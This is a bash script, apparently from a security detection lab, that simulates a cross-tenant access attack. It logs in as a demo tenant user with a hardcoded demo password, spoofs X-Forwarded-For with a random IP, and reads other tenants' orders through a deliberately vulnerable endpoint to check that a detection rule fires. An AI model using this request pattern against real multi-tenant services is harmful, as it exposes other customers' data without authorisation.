#!/bin/bash
# 04-cross-tenant-access: Tenant Alpha user reads Tenant Beta / Gamma orders through
# the vulnerable GET /api/orders/:id endpoint (VULN-002). Should trip RULE-004.
set -e

DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
. "$DIR/../lib.sh"

title "Attack Sim: Cross-Tenant Access (04)"

XFF="$(random_xff)"
log "Using source IP $XFF for this run"

echo ""
log "[1/3] Login as Tenant Alpha user (alice.anderson)..."
TOKEN=$(login "alice.anderson@tenant.alpha.com" "demo_password_123" "$XFF")
[ -n "$TOKEN" ] && ok "Logged in as Tenant Alpha" || { err "Login failed"; exit 1; }

echo ""
log "[2/3] Access own tenant order (order-1, tenant-alpha)..."
OWN=$(curl -s -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: $XFF" "$API/api/orders/order-1")
ok "GET /api/orders/order-1 -> tenantId=$(json_get "$OWN" "tenantId") (own tenant)"

echo ""
log "[3/3] Attempt Tenant Beta / Gamma orders (order-2, order-3)..."
for ORDER_ID in order-2 order-3; do
  RESP=$(curl -s -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: $XFF" "$API/api/orders/$ORDER_ID")
  ok "GET /api/orders/$ORDER_ID -> tenantId=$(json_get "$RESP" "tenantId") (cross-tenant disclosure, VULN-002)"
done

echo ""
run_detection "$XFF"
print_newest_incidents 5

echo ""
title "Cross-tenant access simulation complete (source IP $XFF)"
